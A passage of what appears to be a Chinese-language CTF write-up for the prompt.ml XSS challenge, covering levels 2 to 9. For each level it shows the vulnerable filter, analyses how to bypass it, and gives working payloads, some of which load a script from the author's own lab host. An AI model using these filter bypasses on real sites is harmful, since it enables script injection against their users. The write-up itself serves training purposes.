class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">3. 官方答案:</span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">prompt.call<span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"number\">1</span>&#125;</span>`</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img-2\"><a href=\"#Img-2\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><p><code>&lt;svg&gt;&lt;script&gt;prompt&amp;#x28;1)&lt;/script&gt;</code></p>\n</li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level2_001.png\" alt=\"2_1\"></p>\n<ol start=\"2\">\n<li><p><code>&lt;script&gt;eval.call`${&#39;prompt\\x281)&#39;}`&lt;/script&gt;</code></p>\n<p><img src=\"/img/xss/prompt_ml/level2_002.png\" alt=\"2_2\"></p>\n</li>\n<li><p><code>&lt;script&gt;prompt.call`${1}`&lt;/script&gt;</code><br>  <img src=\"/img/xss/prompt_ml/level2_003.png\" alt=\"2_3\"></p>\n</li>\n</ol>\n<h1 id=\"Level-3\"><a href=\"#Level-3\" class=\"headerlink\" title=\"Level 3\"></a>Level 3</h1><h2 id=\"Code-3\"><a href=\"#Code-3\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span><span class=\"params\">(input)</span></span> &#123;</span><br><span class=\"line\">    // filter potential comment <span class=\"keyword\">end</span> delimiters</span><br><span class=\"line\">    <span class=\"built_in\">input</span> = <span class=\"built_in\">input</span>.replace(/-&gt;/g, <span class=\"string\">'_'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    // comment the <span class=\"built_in\">input</span> to avoid script execution</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;!-- '</span> + <span class=\"built_in\">input</span> + <span class=\"string\">' --&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-3\"><a href=\"#分析-3\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight coq\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤了-&gt;并替换成<span class=\"keyword\">_</span></span><br><span class=\"line\">但是除了--&gt;可以闭合注释，--!&gt;也可以。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Solutions-3\"><a href=\"#Solutions-3\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.--!&gt;<span class=\"tag\">&lt;<span class=\"name\">svg</span>/ <span class=\"attr\">onload</span>=<span class=\"string\">prompt(1)</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">2. 官方答案:</span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"><span class=\"built_in\">eval</span>.call<span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"string\">'prompt\\x281)'</span>&#125;</span>`</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">3. 官方答案:</span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">prompt.call<span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"number\">1</span>&#125;</span>`</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img-3\"><a href=\"#Img-3\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><code>--!&gt;&lt;svg/ onload=prompt(1)&gt;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level3_001.png\" alt=\"3_1\"></p>\n<h1 id=\"Level-4\"><a href=\"#Level-4\" class=\"headerlink\" title=\"Level 4\"></a>Level 4</h1><h2 id=\"Code-4\"><a href=\"#Code-4\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// make sure the script belongs to own site</span></span><br><span class=\"line\">    <span class=\"comment\">// sample script: http://prompt.ml/js/test.js</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"regexp\">/^(?:https?:)?\\/\\/prompt\\.ml\\//i</span>.test(<span class=\"built_in\">decodeURIComponent</span>(input))) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> script = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'script'</span>);</span><br><span class=\"line\">        script.src = input;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> script.outerHTML;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'Invalid resource.'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-4\"><a href=\"#分析-4\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight gcode\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">只能匹配http:<span class=\"comment\">//prompt.ml/或//prompt.ml/下网址,可以利用@绕过访问从而其他域名。</span></span><br><span class=\"line\">这里需要把它的/用url编码<span class=\"meta\">%</span><span class=\"number\">2</span>f,@后的ip填写我php环境搭建的地址,其中的pro.js文件内</span><br><span class=\"line\">填写prompt<span class=\"comment\">(1)</span>即可。</span><br><span class=\"line\">最终payload为：http:<span class=\"comment\">//prompt.ml%2f@10.60.250.250/pro.js</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Solutions-4\"><a href=\"#Solutions-4\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span><span class=\"selector-class\">.http</span>:<span class=\"comment\">//prompt.ml%2f@10.60.250.250/pro.js</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img-4\"><a href=\"#Img-4\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><code>http://prompt.ml%2f@10.60.250.250/pro.js</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level4_001.png\" alt=\"4_1\"></p>\n<h1 id=\"Level-5\"><a href=\"#Level-5\" class=\"headerlink\" title=\"Level 5\"></a>Level 5</h1><h2 id=\"Code-5\"><a href=\"#Code-5\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight xquery\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> escape(input) &#123;</span><br><span class=\"line\">    //<span class=\"built_in\"> apply</span> <span class=\"keyword\">strict</span><span class=\"built_in\"> filter</span> rules <span class=\"keyword\">of</span> level <span class=\"number\">0</span></span><br><span class=\"line\">    //<span class=\"built_in\"> filter</span> <span class=\"string\">\"&gt;\"</span> <span class=\"keyword\">and</span> event handlers</span><br><span class=\"line\">    input = input<span class=\"built_in\">.replace</span>(/&gt;|on.+?=|focus/gi, <span class=\"string\">'_'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;input value=\"'</span> + input + <span class=\"string\">'\" type=\"text\"&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-5\"><a href=\"#分析-5\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">将&gt; onXXX= focus替代为了_ (其中XXX代表任意字符)</span><br><span class=\"line\">过滤&gt;的目的是为了防止&gt;构造闭合。</span><br><span class=\"line\">过滤<span class=\"attribute\">onXXX</span>=是为了过滤on开头的事件。</span><br><span class=\"line\">过滤focus是为了过滤focus事件</span><br><span class=\"line\">对于&lt;input <span class=\"attribute\">value</span>=<span class=\"string\">\"\"</span> <span class=\"attribute\">type</span>=<span class=\"string\">\"text\"</span>&gt;中type和value的顺序,能够利用img</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Solutions-5\"><a href=\"#Solutions-5\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>用换行绕过onXXX=</span><br><span class=\"line\"><span class=\"string\">\" type='image' src=''  onerror</span></span><br><span class=\"line\"><span class=\"string\">=\"</span>prompt(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img-5\"><a href=\"#Img-5\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><p>1.</p>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">\" type='image' src=''  onerror</span></span><br><span class=\"line\">=<span class=\"string\">\"prompt(1)</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/prompt_ml/level5_001.png\" alt=\"5_1\"></p>\n<h1 id=\"Level-6\"><a href=\"#Level-6\" class=\"headerlink\" title=\"Level 6\"></a>Level 6</h1><h2 id=\"Code-6\"><a href=\"#Code-6\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function escape(<span class=\"keyword\">input</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// let's do a post redirection</span></span><br><span class=\"line\">    try &#123;</span><br><span class=\"line\">        <span class=\"comment\">// pass in formURL#formDataJSON</span></span><br><span class=\"line\">        <span class=\"comment\">// e.g. http://httpbin.org/post#&#123;\"name\":\"Matt\"&#125;</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> segments = <span class=\"keyword\">input</span>.<span class=\"keyword\">split</span>('#');</span><br><span class=\"line\">        <span class=\"keyword\">var</span> formURL = segments[0];</span><br><span class=\"line\">        <span class=\"keyword\">var</span> formData = JSON.<span class=\"keyword\">parse</span>(segments[1]);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">var</span> <span class=\"keyword\">form</span> = document.createElement('<span class=\"keyword\">form</span>');</span><br><span class=\"line\">        <span class=\"keyword\">form</span>.action = formURL;</span><br><span class=\"line\">        <span class=\"keyword\">form</span>.method = '<span class=\"keyword\">post</span>';</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i <span class=\"keyword\">in</span> formData) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> <span class=\"keyword\">input</span> = <span class=\"keyword\">form</span>.appendChild(document.createElement('<span class=\"keyword\">input</span>'));</span><br><span class=\"line\">            <span class=\"keyword\">input</span>.name = i;</span><br><span class=\"line\">            <span class=\"keyword\">input</span>.setAttribute('value', formData[i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">form</span>.outerHTML + '                         \\<span class=\"keyword\">n</span>\\</span><br><span class=\"line\">    &lt;script&gt;                                                  \\<span class=\"keyword\">n</span>\\</span><br><span class=\"line\">        <span class=\"comment\">// forbid javascript: or vbscript: and data: stuff    \\n\\</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!/script:|data:/i.<span class=\"keyword\">test</span>(document.forms[0].action)) \\<span class=\"keyword\">n</span>\\</span><br><span class=\"line\">            document.forms[0].submit();                       \\<span class=\"keyword\">n</span>\\</span><br><span class=\"line\">        <span class=\"keyword\">else</span>                                                  \\<span class=\"keyword\">n</span>\\</span><br><span class=\"line\">            document.write(<span class=\"string\">\"Action forbidden.\"</span>)               \\<span class=\"keyword\">n</span>\\</span><br><span class=\"line\">    &lt;/script&gt;                                                 \\<span class=\"keyword\">n</span>\\</span><br><span class=\"line\">        ';</span><br><span class=\"line\">    &#125; catch (<span class=\"keyword\">e</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> 'Invalid <span class=\"keyword\">form</span> data.';</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-6\"><a href=\"#分析-6\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight xl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">以http:<span class=\"comment\">//httpbin.org/post#&#123;\"name\":\"Matt\"&#125;为例</span></span><br><span class=\"line\">用#分成两部分http:<span class=\"comment\">//httpbin.org/post和&#123;\"name\":\"Matt\"&#125;</span></span><br><span class=\"line\">将http:<span class=\"comment\">//httpbin.org/post放入表单的action</span></span><br><span class=\"line\">&#123;<span class=\"string\">\"name\"</span>:<span class=\"string\">\"Matt\"</span>&#125;的<span class=\"keyword\">name</span>放入input的<span class=\"keyword\">name</span>属性,value=Matt</span><br><span class=\"line\">如下：</span><br><span class=\"line\">&lt;form action=<span class=\"string\">\"http://httpbin.org/post\"</span> method=<span class=\"string\">\"post\"</span>&gt;&lt;input <span class=\"keyword\">name</span>=<span class=\"string\">\"name\"</span> value=<span class=\"string\">\"Matt\"</span>&gt;&lt;/form&gt;</span><br><span class=\"line\">之后检查http:<span class=\"comment\">//httpbin.org/post中是否有script:或者data:</span></span><br><span class=\"line\">检查到就报错,没有就提交,目的是禁止使用类似下面的javascript，vbscript和<span class=\"keyword\">data</span></span><br><span class=\"line\">javascript:alert(<span class=\"number\">1</span>)<span class=\"comment\">//</span></span><br><span class=\"line\">vbscript:alert(<span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"keyword\">data</span>:<span class=\"keyword\">text</span>/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</span><br></pre></td></tr></table></figure>\n\n<p>这一课比较抽象,看下答案<code>javascript:prompt(1)#{&quot;action&quot;:1}</code>后做了下实验,通过将input中的name属性设action,能将</p>\n<p>form表单中的action替换成input的。因为input的action为[object HTMLInputElement],所以</p>\n<p>if (!/script:|data:/i.test(document.forms[0].action))就匹配不到,返回False后经过！为真,成功绕过。</p>\n<p><img src=\"/img/xss/prompt_ml/level6_001.png\" alt=\"6_1\"></p>\n<p><img src=\"/img/xss/prompt_ml/level6_002.png\" alt=\"6_2\"></p>\n<h2 id=\"Solutions-6\"><a href=\"#Solutions-6\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span><span class=\"selector-class\">.javascript</span>:prompt(<span class=\"number\">1</span>)#&#123;<span class=\"string\">\"action\"</span>:<span class=\"number\">1</span>&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img-6\"><a href=\"#Img-6\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><code>javascript:prompt(1)#{&quot;action&quot;:1}</code><br> <img src=\"/img/xss/prompt_ml/level6_003.png\" alt=\"6_3\"></li>\n</ol>\n<h1 id=\"Level-7\"><a href=\"#Level-7\" class=\"headerlink\" title=\"Level 7\"></a>Level 7</h1><h2 id=\"Code-7\"><a href=\"#Code-7\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight scilab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span><span class=\"params\">(input)</span> &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">// pass in something like dog#cat#bird#mouse...</span></span><br><span class=\"line\">    var segments = input.split(<span class=\"string\">'#'</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> segments.map(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(title)</span> &#123;</span></span><br><span class=\"line\">        <span class=\"comment\">// title can only contain 12 characters</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'&lt;p class=\"</span>comment<span class=\"string\">\" title=\"</span><span class=\"string\">' + title.slice(0, 12) + '</span><span class=\"string\">\"&gt;&lt;/p&gt;'</span>;</span><br><span class=\"line\">    &#125;).join(<span class=\"string\">'\\n'</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-7\"><a href=\"#分析-7\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><p>通过split将字符串分割成数组,再通过数组的map方法能创建新的数组,新数组格式加工成了</p>\n<p><code>&lt;p class=&quot;comment&quot; title=&quot;最长只有12字符的内容&quot;&gt;&lt;/p&gt;</code></p>\n<p>slice(0,12):取前12个字符。</p>\n<p>来张图体会一下</p>\n<p><img src=\"/img/xss/prompt_ml/level7_001.png\" alt=\"7_1\"></p>\n<p>能修改的内容就是tittle处了,#来分割的新数组。</p>\n<p>可以利用多行注释来打通,注意到一段只有12个字符,要简洁。</p>\n<p>考虑到最短要使用到<code>&lt;svg/onload=prompt(1)</code>的变形。</p>\n<h2 id=\"Solutions-7\"><a href=\"#Solutions-7\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><ol>\n<li><p><code>&quot;&gt;&lt;svg/a=&#39;#&#39;onload=&#39;/*#*/prompt(1)&#39;</code><br>官方答案短一个字符…<br><code>&quot;&gt;&lt;svg/a=#&quot;onload=&#39;/*#*/prompt(1)&#39;</code></p>\n</li>\n<li><p>利用eval函数特性执行拼接内容<br><code>&quot;&gt;&lt;script&gt;/*#*/a=&#39;prom&#39;/*#*/+&#39;pt(1)&#39;/*#*/eval(a)/*#*/&lt;/script&gt;</code></p>\n</li>\n<li><p>利用换行</p>\n</li>\n</ol>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\"&gt;<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"actionscript\"><span class=\"comment\">/*#*/</span>prompt(<span class=\"comment\">/*#*/</span><span class=\"number\">1</span>)<span class=\"comment\">/*#*/</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">1234</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li><code>&quot;&gt;&lt;script&gt;`#${prompt(1)}#`&lt;/script&gt;</code></li>\n</ol>\n<h2 id=\"Img-7\"><a href=\"#Img-7\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><code>&quot;&gt;&lt;svg/a=&#39;#&#39;onload=&#39;/*#*/prompt(1)&#39;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level7_002.png\" alt=\"7_2\"></p>\n<ol start=\"2\">\n<li><code>&quot;&gt;&lt;script&gt;/*#*/a=&#39;prom&#39;/*#*/+&#39;pt(1)&#39;/*#*/eval(a)/*#*/&lt;/script&gt;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level7_003.png\" alt=\"7_3\"></p>\n<ol start=\"3\">\n<li>1234是为了换行</li>\n</ol>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\"&gt;<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"actionscript\"><span class=\"comment\">/*#*/</span>prompt(<span class=\"comment\">/*#*/</span><span class=\"number\">1</span>)<span class=\"comment\">/*#*/</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">1234</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/prompt_ml/level7_004.png\" alt=\"7_4\"></p>\n<ol start=\"4\">\n<li><code>&quot;&gt;&lt;script&gt;`#${prompt(1)}#`&lt;/script&gt;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level7_005.png\" alt=\"7_5\"></p>\n<h1 id=\"Level-8\"><a href=\"#Level-8\" class=\"headerlink\" title=\"Level 8\"></a>Level 8</h1><h2 id=\"Code-8\"><a href=\"#Code-8\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// prevent input from getting out of comment</span></span><br><span class=\"line\">    <span class=\"comment\">// strip off line-breaks and stuff</span></span><br><span class=\"line\">    input = input.replace(<span class=\"regexp\">/[\\r\\n&lt;/\"]/g</span>, <span class=\"string\">''</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'                                \\n\\</span></span><br><span class=\"line\"><span class=\"string\">    &lt;script&gt;                                    \\n\\</span></span><br><span class=\"line\"><span class=\"string\">        // console.log(\"'</span> + input + <span class=\"string\">'\");        \\n\\</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/script&gt; '</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-8\"><a href=\"#分析-8\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight livescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤了换行 &lt; /,解决这题需要绕过换行。</span><br><span class=\"line\">官方给的答案是：</span><br><span class=\"line\">[U+<span class=\"number\">2028</span>]prompt(<span class=\"number\">1</span>)[U+<span class=\"number\">2028</span>]<span class=\"function\">--&gt;</span></span><br><span class=\"line\">这里很多人的都没成功，我在firefox下也没成功,不过chrome是可以的。</span><br><span class=\"line\">prompt<span class=\"function\"><span class=\"params\">(<span class=\"number\">1</span>)</span>--&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>[U+2028]特殊字符在这复制：<a href=\"https://unicode-table.com/en/#2028\" target=\"_blank\" rel=\"noopener\">https://unicode-table.com/en/#2028</a></p>\n<html><b>&#8232;prompt(1)&#8232;&#x2d;&#x2d;></b></html>\n\n<p><img src=\"/img/xss/prompt_ml/level8_001.png\" alt=\"8_1\"></p>\n<h2 id=\"Solutions-8\"><a href=\"#Solutions-8\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><p>仅对chrome有用,firefox不行</p>\n<html><b>&#8232;prompt(1)&#8232;&#x2d;&#x2d;></b></html>\n\n<h2 id=\"Img-8\"><a href=\"#Img-8\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><img src=\"/img/xss/prompt_ml/level8_002.png\" alt=\"8_2\"></li>\n</ol>\n<h1 id=\"Level-9\"><a href=\"#Level-9\" class=\"headerlink\" title=\"Level 9\"></a>Level 9</h1><h2 id=\"Code-9\"><a href=\"#Code-9\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span><span class=\"params\">(input)</span></span> &#123;</span><br><span class=\"line\">    // filter potential start-tags</span><br><span class=\"line\">    <span class=\"built_in\">input</span> = <span class=\"built_in\">input</span>.replace(/&lt;([a-zA-Z])/g, <span class=\"string\">'&lt;_$1'</span>);</span><br><span class=\"line\">    // use all-caps <span class=\"keyword\">for</span> heading</span><br><span class=\"line\">    <span class=\"built_in\">input</span> = <span class=\"built_in\">input</span>.toUpperCase();</span><br><span class=\"line\"></span><br><span class=\"line\">    // sample <span class=\"built_in\">input</span>: you shall <span class=\"keyword\">not</span> pass! =&gt; YOU SHALL NOT PASS!</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;h1&gt;'</span> + <span class=\"built_in\">input</span> + <span class=\"string\">'&lt;/h1&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-9\"><a href=\"#分析-9\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight excel\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">将&lt;XXX 替换成&lt;_XXX (XXX表示任意字符)</span><br><span class=\"line\">然后把小写转换成大写。</span><br><span class=\"line\">可以引用外部文件,利用js的scrpit,src和域名的大小写不敏感绕过。再利用toUpperCase()的特性，它不仅转换英文字母，也转换一些<span class=\"built_in\">Unicode</span>字符，比如将ſ传入就可以转换为S。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Solutions-9\"><a href=\"#Solutions-9\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ſcript</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://192.168.75.132/pro.js\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">这是我本地phpstudy下的pro.js文件,内容只有prompt(1)。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img-9\"><a href=\"#Img-9\" 